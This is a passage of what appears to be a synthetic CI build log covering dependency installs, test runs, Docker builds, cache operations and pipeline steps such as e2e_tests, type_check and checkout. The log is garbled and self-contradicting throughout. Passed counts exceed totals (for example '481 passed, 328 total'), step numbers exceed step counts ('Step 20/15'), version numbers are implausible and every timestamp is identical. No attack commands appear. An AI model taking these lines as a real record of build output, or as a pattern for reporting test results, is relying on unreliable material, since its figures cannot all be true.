submodules...\nFetching submodules...\nCache hit for key-6890\nReady.\n[12:19:43] ERROR: Connection failed\nArtifact uploaded: dist.zip (40MB)\nWARNING: prettier has known vulnerabilities\nStep 3/23: Testing\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWaiting...\nTest Suites: 47 passed, 11 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCoverage: 91% statements, 77% branches\nWARNING: jest has known vulnerabilities\n[12:19:43] INFO: Processing request\nCompiling components/index.js...\nnpm install: resolved 1723 packages\nReady.\nDone.\nGET /health - 200 (46ms)\n[12:19:43] DEBUG: Query executed in 46ms\n[12:19:43] DEBUG: Connection pool: 12 active\n[12:19:43] INFO: Cache refreshed\nTime: 76.632s\nTime: 87.710s\nSnapshots: 15 passed, 36 total\nAlready up to date.\nStep 6/24: Testing\nOK\nSwitched to branch 'hotfix/task-315'\nStep 18/25: Linting\nFAILED: test_db_connect\npip: Collecting webpack\nNODE_ENV=production\nWARNING: eslint has known vulnerabilities\nArtifact downloaded: 6MB\nConnection established\nArtifact downloaded: 37MB\nFinished.\nArtifact uploaded: build.tar.gz (49MB)\nGET /health - 204 (40ms)\n[12:19:43] DEBUG: Connection pool: 4 active\n[12:19:43] DEBUG: Memory usage: 143MB\nCompiling utils/utils.go...\nCache saved successfully\nnpm install: added 60 packages\npip: Installing build dependencies...\nCoverage: 75% statements, 78% branches\nPOST /api - 200 (343ms)\nCompiling components/index.js...\nLayer 6/8: ENV command\nSuccess!\nFinished.\nStep 10/16: Building\n[12:19:43] WARN: Deprecated API usage\nCache saved successfully\n  PASS: e2e/test_db_connect.spec.js\nConnecting to startup.dev:443...\nTransforming 688 files...\nBundling vendor.js\nConnecting to cloud.services:443...\n\u2713 All checks passed\nArtifact uploaded: dist.zip (70MB)\nCoverage: 76% statements, 71% branches\nAlready up to date.\n[12:19:43] DEBUG: Query executed in 2ms\nRan 118 tests in 41s\n  PASS: test_auth_login (312ms)\npip: Installing build dependencies...\n[12:19:43] INFO: Connecting to database\nOK\nHEAD is now at acba5df\n[12:19:43] DEBUG: Loading configuration\nBundling vendor.css\nCreating production build...\nCompiling lib/index.js...\nStep 12/19: Installing dependencies\nWARNING: eslint has known vulnerabilities\nCompiling components/main.py...\nCompiling utils/app.ts...\n[12:19:43] WARN: Deprecated API usage\nBuilding Docker image...\n[12:19:43] WARN: Deprecated API usage\nCompiling src/utils.go...\n[12:19:43] DEBUG: Query executed in 11ms\nFAILED: test_auth_login\nTests: 178 passed, 343 total\n[12:19:43] INFO: Cache refreshed\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (22MB)\nyarn add: Done in 8.81s\nOptimizing 24 modules...\nStep 9/25: Installing dependencies\n\u2713 validate completed\n[12:19:43] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 6/16: Linting\n[12:19:43] DEBUG: Connection pool: 20 active\nTest Suites: 47 passed, 33 total\nStep 4/24: Deploying\n[12:19:43] DEBUG: Connection pool: 3 active\nCoverage: 100% statements, 92% branches\nCompiling lib/handler.rs...\n[12:19:43] DEBUG: Connection pool: 19 active\nWaiting...\nFinished.\nPushing to registry...\nSwitched to branch 'bugfix/task-481'\nCache miss for key-4651\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTLS handshake completed\nBuilding Docker image...\nConnection established\nyarn add: Done in 9.42s\nCoverage: 100% statements, 86% branches\nCache restored successfully (225MB)\nnpm install: added 196 packages\n[12:19:43] DEBUG: Connection pool: 17 active\nTransforming 677 files...\nArtifact uploaded: dist.zip (29MB)\nUploading artifact 'coverage' (45 files)\nCoverage: 79% statements, 77% branches\nnpm install: resolved 411 packages\nCompleted.\nBuilding Docker image...\n  PASS: test_api_health (421ms)\nBuilding Docker image...\nProcessing...\nLayer 3/11: ENV command\nVerifying...\nException: RuntimeError\nGenerating source maps...\nnpm notice: created a lockfile\nVerifying...\n[12:19:43] DEBUG: Connection pool: 2 active\nSwitched to branch 'feature/task-917'\nUploading artifact 'dist' (28 files)\nUsing Python 3.9\n[12:19:43] INFO: Cache refreshed\nConnecting to startup.dev:443...\n[12:19:43] INFO: Cache refreshed\nOptimizing 11 modules...\n[12:19:43] INFO: Request completed\nWaiting...\nSnapshots: 9 passed, 24 total\nReady.\nBuilding Docker image...\nCoverage: 99% statements, 80% branches\nOptimizing 73 modules...\nWaiting...\n[12:19:43] WARN: Deprecated API usage\nRan 22 tests in 34s\nBundling runtime.js\nGenerating source maps...\nWaiting...\nFAILED: test_user_create\n\u2717 build failed with exit code 44\nyarn add: Done in 30.5s\nTime: 98.158s\nCache miss for key-8878\nInstalling prettier@5.0.5\nCache invalidated: build\nHEAD is now at 3e51d58\nCache hit for key-1148\n[12:19:43] DEBUG: Loading configuration\n=== Step install_dependencies completed ===\n=== Step: e2e_tests ===\n\u2713 Step 'setup' succeeded\nFetching submodules...\nStep 20/15: Testing\nPOST /upload - 200 (72ms)\nUploading artifact 'coverage' (35 files)\nRan 56 tests in 47s\npip: Downloading react-3.20.tar.gz\nTLS handshake completed\nCompleted.\n\u2713 Task completed in 2083ms\n[12:19:43] WARN: Deprecated API usage\npip: Downloading prettier-1.3.tar.gz\nyarn add: Done in 9.19s\nnpm notice: created a lockfile\nRan 178 tests in 15s\nWARNING: react has known vulnerabilities\nTransforming 168 files...\nWaiting...\nGenerating source maps...\nConnecting to acme.corp:443...\nPlatform: darwin-arm64\n[12:19:43] DEBUG: Loading configuration\nnpm notice: package.json updated\n[12:19:43] INFO: Request completed\n[12:19:43] INFO: Request completed\nTransforming 209 files...\nnpm install: added 221 packages\n[12:19:43] DEBUG: Connection pool: 4 active\nCoverage: 100% statements, 91% branches\nTLS handshake completed\n[12:19:43] DEBUG: Initializing service\nGET /status - 204 (86ms)\nWARNING: express has known vulnerabilities\nTLS handshake completed\nDone.\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nReady.\nArtifact uploaded: build.tar.gz (9MB)\nUploading artifact 'build' (23 files)\nGenerating source maps...\n[12:19:43] WARN: Deprecated API usage\n\u2713 deploy completed\nAlready up to date.\nStep 16/20: Testing\nnpm notice: created a lockfile\npip: Collecting express\nArtifact uploaded: build.tar.gz (47MB)\nUploading artifact 'dist' (30 files)\nSnapshots: 37 passed, 0 total\nTests: 344 passed, 442 total\nCoverage: 79% statements, 81% branches\n[12:19:43] INFO: Connecting to database\nCache saved successfully\n\u2713 Task completed in 1248ms\nTest Suites: 28 passed, 14 total\nArtifact uploaded: dist.zip (61MB)\n  PASS: integration/test_auth_login.spec.js\npip: Downloading express-4.1.tar.gz\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling components/service.java...\nStep 18/19: Testing\nConnecting to cloud.services:443...\n\u2717 build failed with exit code 108\nCache hit for key-1196\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPushing to registry...\npip: Downloading webpack-3.10.tar.gz\nCompiling components/index.js...\nInstalling prettier@4.8.7\nCompiling utils/main.py...\nGenerating source maps...\n[12:19:43] DEBUG: Loading configuration\nCompiling lib/service.java...\nStep 19/21: Installing dependencies\n[12:19:43] DEBUG: Connection pool: 9 active\nFAILED: test_auth_login\nnpm install: resolved 160 packages\npip install: Successfully installed axios-5.19\n\u2713 Step 'build' succeeded\nProcessing...\nGenerating source maps...\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPulling image: alpine:latest\nArtifact uploaded: build.tar.gz (17MB)\nArtifact downloaded: 37MB\nWARNING: lodash has known vulnerabilities\nCache invalidated: build\n[12:19:43] WARN: Deprecated API usage\nCompiling lib/app.ts...\npip: Downloading express-2.14.tar.gz\n  PASS: test_user_create (345ms)\npip install: Successfully installed webpack-1.8\nStep 20/21: Installing dependencies\nCompiling components/index.js...\nGET /health - 200 (23ms)\nnpm install: resolved 750 packages\nnpm notice: package.json updated\nFinished.\nVerifying...\nWARNING: eslint has known vulnerabilities\n[12:19:43] INFO: Connecting to database\nCompiling lib/index.js...\n[12:19:43] INFO: Processing request\nCompiling lib/handler.rs...\nCache saved successfully\n\u2717 build failed with exit code 83\nPOST /upload - 202 (355ms)\n[12:19:43] DEBUG: Connection pool: 12 active\n[12:19:43] INFO: Connecting to database\nChecking out develop branch\nVerifying...\nRan 114 tests in 58s\nCompiling lib/handler.rs...\nWARNING: webpack has known vulnerabilities\nStep 15/25: Installing dependencies\nGenerating source maps...\nCompleted.\n[12:19:43] DEBUG: Query executed in 21ms\n[12:19:43] DEBUG: Initializing service\nArtifact uploaded: dist.zip (11MB)\nOK\nCache saved successfully\n[12:19:43] INFO: Starting build process\nPushing to registry...\nException: RuntimeError\nCompleted.\nException: RuntimeError\nLayer 2/13: COPY command\n[12:19:43] INFO: Processing request\n[12:19:43] ERROR: Connection failed\nImage pulled successfully\npip: Downloading react-3.8.tar.gz\nArtifact uploaded: build.tar.gz (46MB)\nOK\nSnapshots: 21 passed, 1 total\nConnecting to acme.corp:443...\nCache saved successfully\nSuccess!\nnpm notice: created a lockfile\n[12:19:43] INFO: Request completed\nFinished.\nCompiling components/main.py...\nHEAD is now at fc7703d\nFetching submodules...\nStep 15/19: Running migrations\nMinifying app.js\nTime: 4.503s\n[12:19:43] DEBUG: Query executed in 18ms\nCreating production build...\nCache invalidated: build\nUploading artifact 'coverage' (1 files)\n[12:19:43] DEBUG: Initializing service\n[12:19:43] INFO: Processing request\nImage pulled successfully\n[12:19:43] DEBUG: Query executed in 65ms\nConnection established\n[12:19:43] DEBUG: Initializing service\nWaiting...\n  PASS: test_auth_login (125ms)\nException: NullPointerException\nPOST /api - 202 (174ms)\n  PASS: test_auth_login (477ms)\nDone.\nCompiling utils/main.py...\nGenerating source maps...\n\u2713 All checks passed\nTLS handshake completed\n=== Step e2e_tests completed ===\n=== Step: type_check ===\nLayer 5/13: RUN command\nPOST /upload - 202 (454ms)\nLayer 8/9: ENV command\nnpm notice: package.json updated\nCreating production build...\nStep 17/25: Testing\n\u2713 All checks passed\n[12:19:43] DEBUG: Loading configuration\nVerifying...\nPOST /api - 202 (369ms)\n[12:19:43] INFO: Cache refreshed\n[12:19:43] ERROR: Connection failed\nTransforming 706 files...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nHEAD is now at 1349458\nCompiling utils/utils.go...\nStep 7/18: Building\nSwitched to branch 'hotfix/task-993'\nCache restored successfully (352MB)\nStep 10/18: Installing dependencies\nPlatform: darwin-arm64\nBuilding Docker image...\nSnapshots: 27 passed, 34 total\n[12:19:43] DEBUG: Connection pool: 15 active\nImage pulled successfully\nnpm notice: package.json updated\nTransforming 126 files...\nTest Suites: 38 passed, 8 total\nHEAD is now at 4015483\nRan 144 tests in 6s\nConnection established\nCache invalidated: dependencies\nWARNING: prettier has known vulnerabilities\nStep 9/20: Building\n\u2713 Step 'install' succeeded\n[12:19:43] WARN: Deprecated API usage\n[12:19:43] DEBUG: Loading configuration\nTLS handshake completed\nAlready up to date.\nWARNING: jest has known vulnerabilities\nNODE_ENV=test\npip: Downloading express-1.11.tar.gz\nPlatform: win32-x64\nLoading...\n\u2713 test completed\nConnecting to example.com:443...\npip install: Successfully installed jest-2.7\nPulling image: alpine:18\nGET /api - 200 (88ms)\nCompiling src/app.ts...\nConnecting to acme.corp:443...\nCompiling components/handler.rs...\nArtifact uploaded: dist.zip (87MB)\nLoading...\n[12:19:43] WARN: Deprecated API usage\nConnection established\nCoverage: 88% statements, 93% branches\n[12:19:43] ERROR: Connection failed\nCompiling lib/service.java...\n[12:19:43] INFO: Processing request\nRan 116 tests in 17s\n[12:19:43] INFO: Starting build process\nEnvironment: production\nDone.\nnpm notice: package.json updated\nArtifact uploaded: build.tar.gz (4MB)\nCache miss for key-8406\nUploading artifact 'coverage' (49 files)\nRan 135 tests in 18s\nCompleted.\nNODE_ENV=development\nStep 19/18: Running migrations\nOK\nCompiling src/utils.go...\nCache miss for key-7133\nInstalling express@5.15.2\nOptimizing 25 modules...\n[12:19:43] DEBUG: Loading configuration\nGenerating source maps...\nnpm install: resolved 1091 packages\nCompiling components/index.js...\nFinished.\nCompiling lib/index.js...\n[12:19:43] INFO: Starting build process\n  PASS: test_api_health (349ms)\nCache invalidated: build\n[12:19:43] INFO: Connecting to database\nFinished.\nTLS handshake completed\n[12:19:43] ERROR: Connection failed\nBundling main.js\nNODE_ENV=test\nPulling image: node:18\nHEAD is now at 3659b25\n\u2713 Step 'checkout' succeeded\nArtifact uploaded: build.tar.gz (9MB)\n[12:19:43] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nOK\nPlatform: darwin-arm64\nMinifying vendor.js\nEnvironment: development\nyarn add: Done in 28.41s\nnpm notice: package.json updated\nStep 17/25: Deploying\nStep 6/23: Building\nConnection established\nHEAD is now at dec844d\n\u2713 package completed\n[12:19:43] INFO: Starting build process\n  PASS: e2e/test_cache_hit.spec.js\nSuccess!\n[12:19:43] WARN: Deprecated API usage\n\u2713 All checks passed\n[12:19:43] DEBUG: Initializing service\nWARNING: express has known vulnerabilities\n[12:19:43] INFO: Starting build process\nSnapshots: 38 passed, 35 total\nCache miss for key-7263\nCoverage: 93% statements, 78% branches\nWaiting...\n[12:19:43] DEBUG: Query executed in 54ms\nDone.\nConnecting to cloud.services:443...\n\u2713 package completed\nRan 84 tests in 54s\nnpm install: added 250 packages\n[12:19:43] DEBUG: Query executed in 75ms\npip: Collecting jest\n[12:19:43] WARN: Deprecated API usage\nCompiling components/main.py...\nnpm notice: package.json updated\nWARNING: axios has known vulnerabilities\n[12:19:43] INFO: Request completed\nnpm install: resolved 263 packages\n[12:19:43] DEBUG: Memory usage: 627MB\nRan 157 tests in 29s\nSnapshots: 48 passed, 3 total\nStep 8/15: Running migrations\n[12:19:43] DEBUG: Query executed in 46ms\nCompiling utils/main.py...\nMinifying main.js\n[12:19:43] WARN: Deprecated API usage\nCompiling lib/service.java...\nImage pulled successfully\nStep 2/18: Linting\nCache invalidated: build\nCompleted.\nUsing Node.js 15.16.7\nBundling main.css\nUploading artifact 'coverage' (44 files)\nChecking out main branch\n\u2713 Task completed in 3016ms\nVerifying...\nStep 1/25: Building\nnpm install: added 395 packages\nTest Suites: 32 passed, 22 total\nCache invalidated: build\nTime: 24.106s\nFetching submodules...\nnpm install: added 264 packages\nAlready up to date.\n[12:19:43] INFO: Connecting to database\n  PASS: unit/test_user_create.spec.js\nSwitched to branch 'bugfix/task-424'\n\u2713 Step 'checkout' succeeded\n[12:19:43] DEBUG: Initializing service\nGenerating source maps...\n[12:19:43] INFO: Connecting to database\n\u2717 build failed with exit code 13\nVerifying...\n=== Step type_check completed ===\n=== Step: upload_artifacts ===\nArtifact uploaded: build.tar.gz (49MB)\nFetching submodules...\nMinifying main.js\nBundling runtime.css\n[12:19:43] WARN: Deprecated API usage\n[12:19:43] INFO: Request completed\nProcessing...\nSnapshots: 1 passed, 30 total\nArtifact uploaded: dist.zip (22MB)\nStep 18/18: Building\nCompiling utils/handler.rs...\nCache hit for key-3183\nCache miss for key-7737\nMinifying app.js\n  PASS: integration/test_cache_hit.spec.js\nProcessing...\nSuccess!\nChecking out master branch\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/service.java...\nConnecting to example.com:443...\nFAILED: test_api_health\nPOST /upload - 200 (127ms)\n\u2717 build failed with exit code 6\nGenerating source maps...\nAlready up to date.\nArtifact downloaded: 20MB\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOptimizing 15 modules...\nnpm notice: package.json updated\nMinifying vendor.js\nConnection established\nCompleted.\nyarn add: Done in 30.17s\npip: Downloading eslint-4.7.tar.gz\nWARNING: prettier has known vulnerabilities\nOptimizing 83 modules...\nTransforming 926 files...\n\u2713 Step 'install' succeeded\nTransforming 678 files...\nPushing to registry...\nArtifact downloaded: 35MB\nArtifact uploaded: build.tar.gz (35MB)\nDone.\nCreating production build...\nInstalling react@4.19.8\nMinifying main.js\n\u2713 test completed\nCache saved successfully\nStep 20/15: Deploying\nOK\n[12:19:43] WARN: Deprecated API usage\nnpm install: resolved 1799 packages\nWARNING: express has known vulnerabilities\nLayer 5/9: RUN command\nImage pulled successfully\nNODE_ENV=production\n[12:19:43] INFO: Cache refreshed\n\u2717 build failed with exit code 27\nEnvironment: production\nPOST /data - 200 (88ms)\nChecking out develop branch\nAlready up to date.\n[12:19:43] INFO: Request completed\nUploading artifact 'build' (37 files)\nSnapshots: 26 passed, 0 total\n[12:19:43] DEBUG: Loading configuration\n[12:19:43] INFO: Starting build process\nCache miss for key-4680\nMinifying main.js\nCompiling components/index.js...\nPushing to registry...\nCache saved successfully\n[12:19:43] DEBUG: Query executed in 10ms\npip: Downloading express-5.11.tar.gz\n[12:19:43] INFO: Cache refreshed\n[12:19:43] INFO: Cache refreshed\nStep 19/21: Testing\nFetching submodules...\nPulling image: alpine:3.11\n[12:19:43] INFO: Request completed\n[12:19:43] INFO: Starting build process\n[12:19:43] INFO: Request completed\n[12:19:43] DEBUG: Connection pool: 3 active\nLoading...\nTest Suites: 18 passed, 49 total\nConnecting to cloud.services:443...\nCache miss for key-8997\nConnection established\nnpm install: added 182 packages\nStep 2/22: Deploying\nOptimizing 94 modules...\n[12:19:43] INFO: Starting build process\nCache invalidated: node_modules\n[12:19:43] INFO: Processing request\n[12:19:43] DEBUG: Initializing service\nCompiling components/utils.go...\n  PASS: e2e/test_cache_hit.spec.js\nWARNING: react has known vulnerabilities\nCompiling utils/handler.rs...\nNODE_ENV=development\n\u2713 package completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nyarn add: Done in 22.57s\nCache saved successfully\nProcessing...\nChecking out master branch\nStep 10/19: Testing\nCache miss for key-6159\nWaiting...\nWARNING: express has known vulnerabilities\nConnecting to example.com:443...\nCompiling components/index.js...\nCache saved successfully\nTransforming 353 files...\nUsing Node.js 17.17.9\nTest Suites: 16 passed, 35 total\npip: Downloading webpack-5.2.tar.gz\npip install: Successfully installed lodash-2.0\n[12:19:43] WARN: Deprecated API usage\npip: Installing build dependencies...\nCompiling components/utils.go...\nStep 10/15: Testing\nUsing Node.js 20.12.0\nBundling vendor.js\nnpm notice: created a lockfile\nConnection established\nVerifying...\nVerifying...\nnpm install: resolved 1117 packages\nArtifact uploaded: dist.zip (96MB)\nArtifact uploaded: dist.zip (55MB)\nTest Suites: 20 passed, 35 total\nCache invalidated: node_modules\nOK\npip: Installing build dependencies...\nCompiling components/app.ts...\nCache saved successfully\nPushing to registry...\nCompiling lib/handler.rs...\n\u2713 Task completed in 3857ms\nTransforming 860 files...\nArtifact downloaded: 35MB\n[12:19:43] DEBUG: Initializing service\nMinifying main.js\nStep 6/20: Deploying\nStep 4/24: Running migrations\nInstalling eslint@3.8.0\nConnecting to startup.dev:443...\n[12:19:43] DEBUG: Query executed in 75ms\nTLS handshake completed\n[12:19:43] ERROR: Connection failed\npip: Collecting eslint\nyarn add: Done in 18.96s\nnpm install: resolved 1816 packages\nTime: 33.21s\n[12:19:43] DEBUG: Initializing service\nPlatform: linux-x64\nWaiting...\nArtifact uploaded: dist.zip (21MB)\npip: Installing build dependencies...\nCreating production build...\nGenerating source maps...\nGET /api - 201 (47ms)\npip install: Successfully installed react-2.1\nHEAD is now at 36e7b36\nyarn add: Done in 27.48s\nArtifact downloaded: 26MB\n[12:19:43] DEBUG: Initializing service\nUploading artifact 'dist' (9 files)\n=== Step upload_artifacts completed ===\n=== Step: build ===\nException: ValueError\n\u2713 All checks passed\n\u2713 build completed\nPulling image: alpine:latest\nInstalling axios@4.10.4\npip: Collecting webpack\n[12:19:43] INFO: Request completed\nNODE_ENV=test\nWaiting...\nDone.\nOptimizing 18 modules...\nGenerating source maps...\nSnapshots: 12 passed, 3 total\nPOST /api - 200 (102ms)\n[12:19:43] WARN: Deprecated API usage\n[12:19:43] DEBUG: Memory usage: 1784MB\n[12:19:43] INFO: Processing request\nPlatform: linux-x64\nRan 52 tests in 41s\n\u2713 build completed\nLayer 7/8: ENV command\nWaiting...\nLayer 3/14: ENV command\n[12:19:43] DEBUG: Initializing service\nOK\nUsing Python 3.9\nSuccess!\nFetching submodules...\n\u2713 build completed\n[12:19:43] DEBUG: Loading configuration\nStep 9/24: Running migrations\n[12:19:43] INFO: Starting build process\n\u2713 Task completed in 2875ms\n[12:19:43] INFO: Connecting to database\nSnapshots: 50 passed, 20 total\nWARNING: react has known vulnerabilities\nArtifact downloaded: 40MB\nWARNING: react has known vulnerabilities\nUsing Python 3.9\n[12:19:43] WARN: Deprecated API usage\nCompiling utils/utils.go...\nGenerating source maps...\n\u2713 Task completed in 1106ms\nAlready up to date.\n[12:19:43] INFO: Starting build process\npip: Installing build dependencies...\nInstalling lodash@4.20.9\nLoading...\nPulling image: python:18\nFAILED: test_db_connect\nStep 1/22: Deploying\nSwitched to branch 'bugfix/task-793'\nRan 149 tests in 53s\nBuilding Docker image...\nCompiling utils/utils.go...\n[12:19:43] ERROR: Connection failed\nStep 1/16: Deploying\nCreating production build...\n\u2713 Step 'install' succeeded\nTransforming 533 files...\nnpm notice: package.json updated\nPushing to registry...\nRan 19 tests in 24s\n[12:19:43] DEBUG: Query executed in 40ms\npip install: Successfully installed axios-1.9\nPOST /data - 201 (330ms)\nEnvironment: production\nnpm install: added 42 packages\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTLS handshake completed\nException: NullPointerException\nPulling image: alpine:latest\nCreating production build...\nRan 154 tests in 56s\nTests: 87 passed, 210 total\nCache restored successfully (43MB)\nConnection established\n[12:19:43] DEBUG: Loading configuration\nSnapshots: 19 passed, 42 total\nMinifying app.js\nTLS handshake completed\nCompiling components/service.java...\nTransforming 673 files...\nStep 2/15: Running migrations\nChecking out main branch\nBundling runtime.js\nConnecting to startup.dev:443...\n\u2713 Step 'test' succeeded\nCreating production build...\nTLS handshake completed\nAlready up to date.\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFetching submodules...\nCache saved successfully\nSuccess!\nVerifying...\nFetching submodules...\npip install: Successfully installed react-5.14\nSnapshots: 47 passed, 15 total\nNODE_ENV=development\nDone.\nStep 2/16: Running migrations\nWARNING: webpack has known vulnerabilities\nCache restored successfully (357MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:43] INFO: Connecting to database\n  PASS: test_cache_hit (334ms)\npip install: Successfully installed webpack-1.9\nDone.\nOptimizing 37 modules...\nCompiling utils/index.js...\nPushing to registry...\nException: NullPointerException\nStep 6/17: Installing dependencies\n[12:19:43] DEBUG: Memory usage: 433MB\n\u2717 build failed with exit code 64\n[12:19:43] WARN: Deprecated API usage\nnpm notice: package.json updated\nStep 8/25: Linting\nUsing Python 3.11\nStep 16/20: Deploying\nStep 9/22: Running migrations\nSnapshots: 6 passed, 50 total\nnpm notice: package.json updated\nException: ValueError\nnpm notice: created a lockfile\nPOST /api - 201 (75ms)\nBuilding Docker image...\nFAILED: test_auth_login\nCache miss for key-7094\nNODE_ENV=development\nOptimizing 60 modules...\nFetching submodules...\nLayer 2/10: RUN command\nWARNING: webpack has known vulnerabilities\nEnvironment: production\nNODE_ENV=production\n[12:19:43] INFO: Starting build process\nArtifact downloaded: 4MB\nStep 16/18: Testing\nWaiting...\nnpm install: resolved 1486 packages\nCoverage: 92% statements, 81% branches\nWARNING: express has known vulnerabilities\n\u2713 Step 'setup' succeeded\nStep 6/23: Linting\nConnection established\nArtifact downloaded: 5MB\nLoading...\npip: Downloading express-3.20.tar.gz\nWARNING: lodash has known vulnerabilities\nArtifact downloaded: 5MB\nCompiling utils/utils.go...\nPOST /upload - 202 (248ms)\nPulling image: alpine:3.11\nyarn add: Done in 16.93s\nOptimizing 12 modules...\nCompiling components/handler.rs...\nWaiting...\nCompiling components/handler.rs...\nUsing Python 3.12\nHEAD is now at fcd8905\n\u2713 package completed\npip install: Successfully installed axios-5.17\n[12:19:43] DEBUG: Loading configuration\nBuilding Docker image...\n\u2713 lint completed\nImage pulled successfully\n\u2713 validate completed\n=== Step build completed ===\n=== Step: setup_node ===\nSnapshots: 31 passed, 24 total\nHEAD is now at 8540f00\nnpm install: added 341 packages\nWaiting...\n[12:19:43] DEBUG: Loading configuration\nArtifact uploaded: dist.zip (83MB)\n\u2713 Step 'setup' succeeded\nSnapshots: 22 passed, 36 total\nStep 17/19: Installing dependencies\nWARNING: react has known vulnerabilities\n[12:19:43] INFO: Request completed\n\u2713 Step 'build' succeeded\nSwitched to branch 'bugfix/task-768'\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling lib/index.js...\nFAILED: test_api_health\nCompiling utils/index.js...\nCoverage: 85% statements, 97% branches\nConnection established\nGenerating source maps...\nBuilding Docker image...\n[12:19:43] INFO: Connecting to database\nDone.\nCompleted.\n[12:19:43] WARN: Deprecated API usage\nSuccess!\nSwitched to branch 'feature/task-462'\n[12:19:43] DEBUG: Connection pool: 11 active\nVerifying...\nConnection established\nConnecting to test.io:443...\nInstalling lodash@1.18.2\nTest Suites: 8 passed, 21 total\nGET /health - 204 (67ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_user_create (331ms)\nGenerating source maps...\nDone.\n[12:19:43] INFO: Starting build process\nnpm install: added 349 packages\nOK\nImage pulled successfully\nStep 10/23: Testing\n[12:19:43] INFO: Cache refreshed\nGET /health - 201 (30ms)\n[12:19:43] INFO: Cache refreshed\n[12:19:43] DEBUG: Initializing service\nFAILED: test_db_connect\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nBuilding Docker image...\nWARNING: express has known vulnerabilities\nLoading...\nStep 11/23: Testing\nSwitched to branch 'hotfix/task-376'\nStep 7/16: Testing\n[12:19:43] DEBUG: Connection pool: 14 active\nWaiting...\nBuilding Docker image...\nGenerating source maps...\nCache hit for key-1287\nConnection established\nCompiling utils/app.ts...\nGenerating source maps...\n[12:19:43] INFO: Request completed\nPulling image: node:3.11\nRan 77 tests in 10s\nInstalling lodash@2.10.3\npip: Installing build dependencies...\nCompiling lib/app.ts...\npip: Collecting axios\nGET /api - 201 (38ms)\nnpm notice: created a lockfile\nSwitched to branch 'feature/task-232'\nUploading artifact 'build' (14 files)\nConnecting to test.io:443...\nBuilding Docker image...\nPushing to registry...\nConnection established\nSnapshots: 8 passed, 20 total\nUploading artifact 'dist' (36 files)\nnpm install: added 384 packages\n\u2713 Task completed in 4164ms\n  PASS: e2e/test_api_health.spec.js\nCache invalidated: node_modules\n[12:19:43] INFO: Cache refreshed\nConnection established\nnpm notice: created a lockfile\nnpm install: resolved 677 packages\nCache invalidated: dependencies\nArtifact downloaded: 30MB\nWARNING: express has known vulnerabilities\n\u2713 All checks passed\nChecking out master branch\nStep 9/25: Running migrations\npip: Installing build dependencies...\nCreating production build...\nConnection established\nCreating production build...\nInstalling axios@1.19.3\nInstalling jest@5.20.4\nDone.\npip install: Successfully installed express-2.18\nBuilding Docker image...\nReady.\nPOST /data - 200 (135ms)\nStep 5/15: Linting\nUsing Python 3.11\nCompleted.\nAlready up to date.\nUsing Node.js 19.4.9\nStep 12/18: Deploying\n\u2713 All checks passed\nMinifying app.js\nException: RuntimeError\nOK\nCompiling components/utils.go...\nnpm install: resolved 994 packages\n[12:19:43] INFO: Processing request\nCache restored successfully (436MB)\n\u2713 All checks passed\nStep 17/21: Testing\nWaiting...\n\u2717 build failed with exit code 55\nCompleted.\nBuilding Docker image...\nChecking out master branch\nCoverage: 74% statements, 86% branches\nCompiling lib/service.java...\nStep 13/23: Testing\n\u2713 Task completed in 762ms\nGET /health - 201 (20ms)\nConnection established\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSwitched to branch 'bugfix/task-275'\n[12:19:43] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (17MB)\nGET /health - 204 (14ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact downloaded: 48MB\nTime: 61.576s\nStep 14/16: Running migrations\nChecking out develop branch\nnpm notice: created a lockfile\nLoading...\nStep 8/15: Installing dependencies\npip: Downloading prettier-4.10.tar.gz\npip: Downloading eslint-2.4.tar.gz\nCache restored successfully (451MB)\nArtifact uploaded: dist.zip (86MB)\nLoading...\n\u2713 All checks passed\n[12:19:43] INFO: Request completed\nTests: 481 passed, 328 total\n\u2713 Step 'setup' succeeded\nnpm install: added 122 packages\nFinished.\nArtifact uploaded: dist.zip (2MB)\nUsing Python 3.10\npip: Downloading jest-2.1.tar.gz\nTransforming 787 files...\nTime: 28.728s\nDone.\nInstalling jest@1.8.7\nStep 6/15: Linting\nPulling image: node:3.11\n[12:19:43] DEBUG: Initializing service\n[12:19:43] DEBUG: Query executed in 31ms\nnpm install: added 52 packages\n\u2713 All checks passed\n[12:19:43] INFO: Cache refreshed\n=== Step setup_node completed ===\n=== Step: checkout ===\nCreating production build...\nArtifact uploaded: build.tar.gz (39MB)\nStep 20/15: Installing dependencies\nyarn add: Done in 8.56s\n[12:19:43] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (45MB)\nHEAD is now at c90e12a\nCoverage: 95% statements, 96% branches\n[12:19:43] DEBUG: Connection pool: 13 active\npip: Collecting webpack\nTests: 427 passed, 373 total\nFinished.\nWARNING: lodash has known vulnerabilities\n[12:19:43] WARN: Deprecated API usage\nTime: 68.655s\nEnvironment: development\nRan 148 tests in 50s\nTime: 5.557s\nBundling runtime.js\nException: TypeError\nWaiting...\nUploading artifact 'build' (7 files)\nOK\nyarn add: Done in 1.75s\n\u2717 build failed with exit code 29\nDone.\nPlatform: win32-x64\nHEAD is now at 8a285dc\n[12:19:43] DEBUG: Loading configuration\n[12:19:43] DEBUG: Loading configuration\n[12:19:43] INFO: Cache refreshed\nTests: 398 